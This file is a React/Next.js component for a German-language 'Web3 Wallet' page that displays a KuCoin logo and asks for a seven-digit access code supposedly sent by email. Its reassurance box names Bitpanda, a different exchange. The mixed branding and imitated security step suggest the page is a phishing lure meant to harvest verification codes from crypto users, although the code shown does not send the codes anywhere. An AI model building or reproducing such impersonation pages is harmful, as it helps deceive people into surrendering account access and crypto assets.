"use client"

import type React from "react"
import Image from "next/image"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Shield } from "lucide-react"

export default function Component() {
  const [code, setCode] = useState(["", "", "", "", "", "", ""])

  const handleInputChange = (index: number, value: string) => {
    if (value.length <= 1) {
      const newCode = [...code]
      newCode[index] = value
      setCode(newCode)

      // Auto-focus next input
      if (value && index < 6) {
        const nextInput = document.getElementById(`code-${index + 1}`)
        nextInput?.focus()
      }
    }
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      const prevInput = document.getElementById(`code-${index - 1}`)
      prevInput?.focus()
    }
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <div className="flex items-center px-8 py-6">
        <div className="flex items-center gap-3">
          <Image
            src="/images/kucoin-logo.png"
            alt="KuCoin Logo"
            width={200}
            height={50}
            className="h-12 w-auto"
            priority
          />
          <span className="text-2xl text-gray-600 ml-3">Web3 Wallet</span>
        </div>
      </div>

      {/* Progress Bar */}
      <div className="px-8 mb-12">
        <div className="flex gap-2">
          <div className="h-1 bg-green-400 rounded-full flex-1"></div>
          <div className="h-1 bg-gray-200 rounded-full flex-1"></div>
          <div className="h-1 bg-gray-200 rounded-full flex-1"></div>
          <div className="h-1 bg-gray-200 rounded-full flex-1"></div>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 px-8 max-w-2xl">
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-4">Geben sie Ihren Web3 Zugangscode ein</h1>
          <p className="text-gray-600 text-lg leading-relaxed">
            Dieser <span className="font-semibold">Zugangscode</span> sollte Ihnen per E-Mail zugestellt worden sein. So
            können wir Ihre Web3 Wallet schützen, indem wir Ihre Identität überprüfen.
          </p>
        </div>

        {/* Code Input */}
        <div className="mb-8">
          <div className="flex gap-3 mb-8">
            {code.map((digit, index) => (
              <Input
                key={index}
                id={`code-${index}`}
                type="text"
                value={digit}
                onChange={(e) => handleInputChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                className="w-14 h-14 text-center text-xl font-semibold border-2 border-gray-300 rounded-lg focus:border-green-400 focus:ring-0"
                maxLength={1}
              />
            ))}
          </div>

          <Button
            className="w-full h-14 bg-green-200 hover:bg-green-300 text-gray-700 font-semibold text-lg rounded-lg"
            disabled={code.some((digit) => !digit)}
          >
            Fortfahren
          </Button>
        </div>

        {/* Info Box */}
        <div className="bg-gray-50 border border-gray-200 rounded-lg p-6">
          <div className="flex items-start gap-3">
            <Shield className="w-5 h-5 text-gray-600 mt-1 flex-shrink-0" />
            <div>
              <h3 className="font-semibold text-gray-900 mb-2">Hinweis</h3>
              <p className="text-gray-700 text-sm leading-relaxed">
                Die Sicherheit deiner Assets hat höchste Priorität: Bitpanda schützt Krypto-Assets mit umfangreichen
                Sicherheitsmaßnahmen und bewahrt sie in regelmäßig geprüften Cold Wallets auf – deine Assets bleiben
                stets dein Eigentum.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
